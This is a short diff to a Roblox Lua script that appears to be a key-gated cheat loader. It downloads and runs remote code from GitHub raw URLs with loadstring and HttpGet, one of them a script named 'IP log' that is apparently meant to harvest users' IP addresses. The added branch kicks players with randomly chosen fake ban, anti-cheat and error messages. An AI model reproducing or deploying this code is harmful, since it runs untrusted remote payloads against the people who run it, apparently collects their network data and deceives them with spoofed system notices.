@@ -1,7 +1,26 @@
+local player = game:GetService("Players").LocalPlayer
+
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Fykas7077/Fykas7077/main/Key'),true))()
 
 if _G.key == _G.Key then
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Fykas7077/Fykas7077/main/IP%20log'),true))()
 	else
-	print("no key...")
+
+	local random = math.random(1, 5)
+	local text = "Permanent Ban"
+
+	if random == 1 then
+		text = "Anti Cheat Detected"
+	elseif random == 2 then
+		text = "Permanent Ban"
+	elseif random == 3 then
+		text = " Error ;173 "
+	elseif random == 4 then
+		text = "Ban Code : 030"
+	elseif random == 5 then
+		text = "인터넷 연결 안됨"
+	end
+
+	player:Kick(text)
+
 end
